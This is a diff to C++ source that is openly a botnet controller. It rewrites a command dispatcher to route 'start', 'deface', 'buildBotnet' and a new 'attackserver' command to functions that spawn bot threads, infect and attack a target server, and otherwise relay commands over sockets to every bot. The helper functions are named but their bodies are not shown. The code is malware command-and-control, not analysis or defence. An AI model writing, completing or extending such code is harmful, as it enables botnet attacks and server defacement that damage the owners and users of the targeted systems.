@@ -81,26 +81,40 @@ void buildBotnet() {
 }
 
 void executeCommand(const std::string& command) {
-    for (const auto& bot : bots) {
-        int sock;
+    if (command == "start") {
+        spawnBotThreads(target);
+    }
+    else if (command == "deface") {
+        infectServer(target);
+    }
+    else if (command == "buildBotnet") {
+        buildBotnet();
+    }
+    else if (command == "attackserver") {  // New command
+        attackServer(target);
+    }
+    else {
+        for (const auto& bot : bots) {
+            int sock;
 
-        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
-            return;
-        }
+            if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+                return;
+            }
 
-        struct sockaddr_in botAddr;
-        botAddr.sin_family = AF_INET;
-        botAddr.sin_port = htons(bot.port);
-        botAddr.sin_addr.s_addr = inet_addr(bot.ip.c_str());
+            struct sockaddr_in botAddr;
+            botAddr.sin_family = AF_INET;
+            botAddr.sin_port = htons(bot.port);
+            botAddr.sin_addr.s_addr = inet_addr(bot.ip.c_str());
 
-        if (connect(sock, (struct sockaddr*)&botAddr, sizeof(botAddr)) < 0) {
+            if (connect(sock, (struct sockaddr*)&botAddr, sizeof(botAddr)) < 0) {
+                close(sock);
+                return;
+            }
+
+            send(sock, command.c_str(), command.size(), 0);
+
             close(sock);
-            return;
         }
-
-        send(sock, command.c_str(), command.size(), 0);
-
-        close(sock);
     }
 }
 
@@ -122,4 +136,4 @@ int main() {
     }
 
     return 0;
-} 
+}
